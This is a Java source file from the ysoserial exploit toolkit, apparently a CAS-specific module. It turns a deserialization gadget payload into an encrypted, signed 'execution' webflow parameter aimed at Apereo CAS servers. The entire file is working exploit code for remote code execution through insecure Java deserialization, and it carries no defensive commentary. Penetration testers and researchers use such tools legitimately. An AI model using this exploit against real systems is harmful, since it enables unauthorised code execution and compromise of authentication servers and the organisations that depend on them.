package ysoserial.exploit;

import org.jasig.cas.util.BinaryCipherExecutor;
import org.jasig.spring.webflow.plugin.ClientFlowExecutionKey;
import ysoserial.payloads.ObjectPayload;

import java.io.ByteArrayOutputStream;
import java.io.ObjectOutputStream;
import java.util.zip.GZIPOutputStream;

public class ApereoExploit {
    public static void main(String[] args) throws Exception{
        if ( args.length < 4 ) {
            System.err.println(ApereoExploit.class.getName() + " <encryptionSecretKey> <signingSecretKey> <payload_type> <payload_arg>");
            System.exit(-1);
        }
        final Object payloadObject = ObjectPayload.Utils.makePayloadObject(args[2], args[3]);
        final ByteArrayOutputStream outBuffer = new ByteArrayOutputStream();
        ObjectOutputStream out = null;
        try {
                out = new ObjectOutputStream(new GZIPOutputStream(outBuffer));
                out.writeObject(payloadObject);
        } finally {
            if (out != null) {
                out.close();
            }
        }
        BinaryCipherExecutor binaryCipherExecutor = new BinaryCipherExecutor(args[0],args[1]);
        byte[] bytes = binaryCipherExecutor.encode(outBuffer.toByteArray());
        ClientFlowExecutionKey clientFlowExecutionKey =  new ClientFlowExecutionKey(bytes);
        System.out.println("execution="+clientFlowExecutionKey.toString());
    }
}
